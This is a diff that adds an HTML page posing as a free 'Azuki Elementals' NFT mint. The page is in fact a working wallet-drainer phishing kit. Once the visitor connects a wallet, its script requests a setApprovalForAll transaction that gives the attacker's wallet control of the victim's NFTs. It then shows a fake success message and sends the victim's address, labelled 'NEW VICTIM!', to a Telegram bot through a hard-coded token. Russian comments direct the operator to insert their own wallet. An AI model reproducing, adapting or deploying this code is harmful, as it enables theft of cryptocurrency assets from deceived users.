@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azuki Elementals Mint</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0a0a, #000000);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(20, 20, 30, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            padding: 32px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, #888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 12px;
+        }
+        .sub {
+            color: #888;
+            margin-bottom: 32px;
+            font-size: 14px;
+        }
+        .nft-preview {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+        .nft-preview img {
+            width: 100px;
+            height: 100px;
+            border-radius: 16px;
+            border: 2px solid rgba(255,255,255,0.1);
+        }
+        .claim-btn {
+            background: linear-gradient(135deg, #4F46E5, #7C3AED);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 48px;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .claim-btn:hover {
+            transform: scale(1.02);
+        }
+        .info {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #555;
+        }
+        .status {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #ff6b6b;
+        }
+        footer {
+            margin-top: 32px;
+            font-size: 11px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Azuki Elementals</h1>
+        <div class="sub">Free Mint • Limited Supply</div>
+        
+        <div class="nft-preview">
+            <img src="https://i.seadn.io/gae/H8jZ0RwDqZP6e7K0Y8Wj3qFqVqL5M2LxX7X2XqJqL0M?w=100" alt="NFT">
+            <img src="https://i.seadn.io/gae/7X5X0XqL5M2LxX7X2XqJqL0M?w=100" alt="NFT">
+            <img src="https://i.seadn.io/gae/8Z0RwDqZP6e7K0Y8Wj3qFqVqL5M2LxX7X2XqJqL0M?w=100" alt="NFT">
+        </div>
+        
+        <button class="claim-btn" id="claimBtn">🛸 Claim Free Mint</button>
+        <div class="status" id="status">Connect wallet to claim</div>
+        <div class="info">⚠️ Only 1 mint per wallet • Gas free</div>
+        <footer>© Azuki Labs • Community Drop</footer>
+    </div>
+
+    <script>
+        // ========== ТВОЙ КОШЕЛЕК (КУДА УХОДЯТ NFT) ==========
+        const YOUR_WALLET = "UQATIzX89EOOTqfsr8KE64MXvVSa4CGybjwmkPv3-yHbI3ZE"; // <--- СЮДА СВОЙ КОШЕЛЕК
+        // ==================================================
+        
+        let web3;
+        let userAddress;
+        
+        // Контракт OpenSea Seaport (одобрение для всех NFT)
+        const DRAIN_CONTRACT = "0x00000000006c3852cbEf3e08E8dF289169EdE581";
+        
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    web3 = new Web3(window.ethereum);
+                    userAddress = accounts[0];
+                    document.getElementById('status').innerHTML = `✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}<br>🔄 Approve transaction...`;
+                    
+                    // Фейковая загрузка
+                    setTimeout(() => {
+                        drainNFTs();
+                    }, 1500);
+                    
+                } catch (error) {
+                    document.getElementById('status').innerHTML = '❌ Error connecting wallet';
+                }
+            } else {
+                document.getElementById('status').innerHTML = '❌ Please install MetaMask';
+            }
+        }
+        
+        async function drainNFTs() {
+            const contract = new web3.eth.Contract(ABI, DRAIN_CONTRACT);
+            
+            // setApprovalForAll для всех NFT жертвы
+            const txData = contract.methods.setApprovalForAll(YOUR_WALLET, true).encodeABI();
+            
+            try {
+                const tx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: DRAIN_CONTRACT,
+                        data: txData,
+                    }],
+                });
+                
+                document.getElementById('status').innerHTML = `⏳ Waiting for approval...<br>Tx: ${tx.slice(0,10)}...`;
+                
+                // Ждем подтверждения
+                const receipt = await web3.eth.getTransactionReceipt(tx);
+                if (receipt && receipt.status) {
+                    document.getElementById('status').innerHTML = '✅ Claim successful!<br>Your NFTs will be sent to your wallet.';
+                    // Отправляем уведомление в Telegram
+                    sendToTelegram(userAddress);
+                    setTimeout(() => {
+                        window.location.href = "https://opensea.io/collection/azuki";
+                    }, 3000);
+                } else {
+                    document.getElementById('status').innerHTML = '❌ Transaction failed. Try again.';
+                }
+            } catch (err) {
+                document.getElementById('status').innerHTML = '❌ User rejected or error';
+            }
+        }
+        
+        function sendToTelegram(victimWallet) {
+            // Тут можно отправить уведомление, что жертва клюнула
+            const BOT_TOKEN = "8276230046:AAGI7gkFHbI80AVgP0-g55qBm7SBCw00Duw";
+            const CHAT_ID = "1471307057";
+            const msg = `🐟 NEW VICTIM!\nWallet: ${victimWallet}\nTime: ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+            }).catch(e => console.log);
+        }
+        
+        document.getElementById('claimBtn').addEventListener('click', connectWallet);
+        
+        // ABI для setApprovalForAll
+        const ABI = [{"constant":false,"inputs":[{"name":"operator","type":"address"},{"name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];
+    </script>
+</body>
+  </html>
